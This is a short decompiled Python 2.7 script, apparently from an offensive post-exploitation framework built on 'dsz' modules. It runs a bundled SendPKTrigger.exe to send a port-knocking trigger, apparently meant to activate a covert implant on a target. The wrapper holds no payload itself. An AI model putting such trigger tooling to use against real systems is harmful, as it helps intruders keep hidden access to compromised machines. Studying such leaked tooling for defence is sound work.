# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: _Knock.py
import dsz
import dsz.lp
import dsz.version
import sys

def main():
    resDir = dsz.lp.GetResourcesDirectory()
    ver = dsz.version.Info(dsz.script.Env['local_address'])
    toolLoc = resDir + 'Pc\\Tools\\%s-%s\\SendPKTrigger.exe' % (ver.compiledArch, ver.os)
    dsz.control.echo.On()
    if not dsz.cmd.Run('local run -command "%s %s" -redirect -noinput' % (toolLoc, ' '.join(sys.argv[1:]))):
        dsz.ui.Echo('* Failed to send port knocking trigger', dsz.ERROR)
    dsz.control.echo.Off()
    return True


if __name__ == '__main__':
    if main() != True:
        sys.exit(-1)